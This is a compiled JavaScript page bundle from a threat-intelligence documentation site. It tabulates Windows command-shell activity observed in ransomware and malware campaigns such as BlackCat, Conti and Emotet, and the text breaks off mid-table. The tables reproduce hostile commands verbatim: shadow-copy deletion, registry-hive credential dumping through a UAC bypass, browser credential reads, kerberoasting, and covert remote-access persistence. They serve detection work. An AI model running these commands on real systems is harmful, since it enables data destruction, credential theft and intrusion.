"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[3253],{4137:function(e,t,a){a.d(t,{Zo:function(){return s},kt:function(){return k}});var n=a(7294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function l(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function i(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?l(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):l(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function m(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},l=Object.keys(e);for(n=0;n<l.length;n++)a=l[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(n=0;n<l.length;n++)a=l[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var d=n.createContext({}),o=function(e){var t=n.useContext(d),a=t;return e&&(a="function"==typeof e?e(t):i(i({},t),e)),a},s=function(e){var t=o(e.components);return n.createElement(d.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},c=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,l=e.originalType,d=e.parentName,s=m(e,["components","mdxType","originalType","parentName"]),c=o(a),k=r,u=c["".concat(d,".").concat(k)]||c[k]||p[k]||l;return a?n.createElement(u,i(i({ref:t},s),{},{components:a})):n.createElement(u,i({ref:t},s))}));function k(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var l=a.length,i=new Array(l);i[0]=c;var m={};for(var d in t)hasOwnProperty.call(t,d)&&(m[d]=t[d]);m.originalType=e,m.mdxType="string"==typeof e?e:r,i[1]=m;for(var o=2;o<l;o++)i[o]=a[o];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}c.displayName="MDXCreateElement"},534:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return m},contentTitle:function(){return d},metadata:function(){return o},toc:function(){return s},default:function(){return c}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=["components"],m={},d=void 0,o={unversionedId:"Techniques/T1059.003 - Command and Scripting Interpreter- Windows Command Shell",id:"Techniques/T1059.003 - Command and Scripting Interpreter- Windows Command Shell",isDocsHomePage:!1,title:"T1059.003 - Command and Scripting Interpreter- Windows Command Shell",description:"Found 56 references across 15 AC3 Threat Sightings. Enjoy!",source:"@site/docs/05-Techniques/T1059.003 - Command and Scripting Interpreter- Windows Command Shell.md",sourceDirName:"05-Techniques",slug:"/Techniques/T1059.003 - Command and Scripting Interpreter- Windows Command Shell",permalink:"/ac3-threat-sightings/docs/Techniques/T1059.003 - Command and Scripting Interpreter- Windows Command Shell",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"T1059.001 - Command and Scripting Interpreter- PowerShell",permalink:"/ac3-threat-sightings/docs/Techniques/T1059.001 - Command and Scripting Interpreter- PowerShell"},next:{title:"T1059.005 - Command and Scripting Interpreter- Visual Basic",permalink:"/ac3-threat-sightings/docs/Techniques/T1059.005 - Command and Scripting Interpreter- Visual Basic"}},s=[{value:"From the AC3 Threat Sighting for <em>BlackCat Ransomware</em>",id:"from-the-ac3-threat-sighting-for-blackcat-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Conti Ransomware</em>",id:"from-the-ac3-threat-sighting-for-conti-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Darkside Ransomware</em>",id:"from-the-ac3-threat-sighting-for-darkside-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Diavol Ransomware</em>",id:"from-the-ac3-threat-sighting-for-diavol-ransomware",children:[]},{value:"From the AC3 Threat Sighting for <em>Emotet Dec2021</em>",id:"from-the-ac3-threat-sighting-for-emotet-dec2021",children:[]},{value:"From the AC3 Threat Sighting for <em>Guildma RAT</em>",id:"from-the-ac3-threat-sighting-for-guildma-rat",children:[]},{value:"From the AC3 Threat Sighting for <em>Hafnium</em>",id:"from-the-ac3-threat-sighting-for-hafnium",children:[]},{value:"From the AC3 Threat Sighting for <em>HermeticWiper</em>",id:"from-the-ac3-threat-sighting-for-hermeticwiper",children:[]},{value:"From the AC3 Threat Sighting for <em>LemonDuck Malware</em>",id:"from-the-ac3-threat-sighting-for-lemonduck-malware",children:[]},{value:"From the AC3 Threat Sighting for <em>Raccoon InfoStealer</em>",id:"from-the-ac3-threat-sighting-for-raccoon-infostealer",children:[]},{value:"From the AC3 Threat Sighting for <em>TA551</em>",id:"from-the-ac3-threat-sighting-for-ta551",children:[]},{value:"From the AC3 Threat Sighting for <em>Tortillas Babuk</em>",id:"from-the-ac3-threat-sighting-for-tortillas-babuk",children:[]},{value:"From the AC3 Threat Sighting for <em>UNK-Credential Access</em>",id:"from-the-ac3-threat-sighting-for-unk-credential-access",children:[]},{value:"From the AC3 Threat Sighting for <em>UNK-Phishing</em>",id:"from-the-ac3-threat-sighting-for-unk-phishing",children:[]},{value:"From the AC3 Threat Sighting for <em>WhisperGate</em>",id:"from-the-ac3-threat-sighting-for-whispergate",children:[]}],p={toc:s};function c(e){var t=e.components,a=(0,r.Z)(e,i);return(0,l.kt)("wrapper",(0,n.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("p",null,"Found 56 references across 15 AC3 Threat Sightings. Enjoy!"),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-blackcat-ransomware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"BlackCat Ransomware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_BlackCat_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_BlackCat_Ransomware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat malware has used ",(0,l.kt)("em",{parentName:"td"},"vssadmin.exe")," to delete Volume Shadow Copies for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," for command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"cmd\\" /c \\"vssadmin.exe delete shadows /all /quiet\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat malware has used ",(0,l.kt)("em",{parentName:"td"},"WMIC.exe")," to obtain system UUID for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," for command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"cmd\\" /c \\"wmic csproduct get UUID\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat malware has used ",(0,l.kt)("em",{parentName:"td"},"fsutil.exe")," to modifify symbolic link evaluation settings for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," for command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"cmd\\" /c \\"fsutil behavior set SymlinkEvaluation R2L:1\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat malware has used ",(0,l.kt)("em",{parentName:"td"},"reg.exe")," to modify SMB protocol implementation settings for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," for command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"cmd\\" /c \\"reg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat malware has used ",(0,l.kt)("em",{parentName:"td"},"net.exe")," to mount remote drives for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},"BlackCat launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," for command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"cmd\\" /c \\"net use \\\\\\\\REMOTEDIR /user:Administrator password /persistent:no\\"'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-conti-ransomware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Conti Ransomware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"vssadmin via WMI and Cobalt Strike")," to create a Volume Shadow Copy for Collection."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," ran ",(0,l.kt)("em",{parentName:"td"},"vssadmin")," command on domain controler (list and create Volume Shadow Copy)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin create shadow /for=C: 2>&1\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used a ",(0,l.kt)("em",{parentName:"td"},"PowerShell inline script via Cobalt Strike")," to download and install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," Remote Access Tool for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell ISE")," spawns ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands to install AnyDesk."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\\\ProgramData\\\\AnyDesk.exe --install C:\\\\ProgramData\\\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c echo J9kzQ2Y0qO \\| C:\\\\ProgramData\\\\anydesk.exe --set-password"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-darkside-ransomware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Darkside Ransomware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer")," opened ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-diavol-ransomware"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Diavol Ransomware")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used a well known set of ",(0,l.kt)("em",{parentName:"td"},"net.exe")," and ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," commands for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},"Sequence of ",(0,l.kt)("em",{parentName:"td"},"net.exe")," and ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net group /domain admins"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain Computers\\" /domain'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net localgroup administrator"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"net view /all"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /domain_trusts /alltrusts"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute a well-known ",(0,l.kt)("em",{parentName:"td"},"AdFind")," recon script for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},"Injected ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," launched ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute ",(0,l.kt)("em",{parentName:"td"},"AdFind")," recon script."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /C adf.bat"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a ",(0,l.kt)("em",{parentName:"td"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},"Dumped SAM, SECURITY and SYSTEM registry hives using a batch script named 'fodhelper_reg_hashes.bat'."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\sam c:\\\\ProgramData\\\\sam.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\security c:\\\\ProgramData\\\\security.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /ve /d \\"reg.exe save hklm\\\\system c:\\\\ProgramData\\\\system.save\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg.exe add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\"DelegateExecute\\" /f fodhelper.exe'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"reg.exe delete hkcu\\\\software\\\\classes\\\\ms-settings /f >nul 2>&1"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MORE.COM")," command-line tool to access Web Browser internal files for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"MORE.COM")," commands to read Web Browser internal files"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Cookies"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"more C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\edge-cookies.json"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Rubeus.exe")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"Rubeus")," to output results at ProgramData folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe kerberoast /ldapfilter:\\'admincount=1\\' /format:hashcat /outfile:C:\\\\ProgramData\\\\hashes.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe /C Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\ProgramData\\\\asrephashes.txt"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," to install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," commands to install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk.exe"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- `cmd.exe /c echo J9kzQ2Y0qO")))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-emotet-dec2021"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Emotet Dec2021")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Emotet_Dec2021.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch system native tools for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\\\\\root\\\\directory\\\\ldap PATH ds_user GET ds_mail"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned _CMD for creating Persistence via SCHTASK."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /create /tn \\"ObjectStoreRecoveryUpdateTask2\\" /tr \\"rundll32 C:\\\\Users\\\\#{user}\\\\Saved Games\\\\log.dll Helper pov\\" /sc minute /mo 35'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for executing scheduled task via SCHTASK."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /run /TN \\"ObjectStoreRecoveryUpdateTask2\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for multiple discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user #{user} /#{domain}"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege 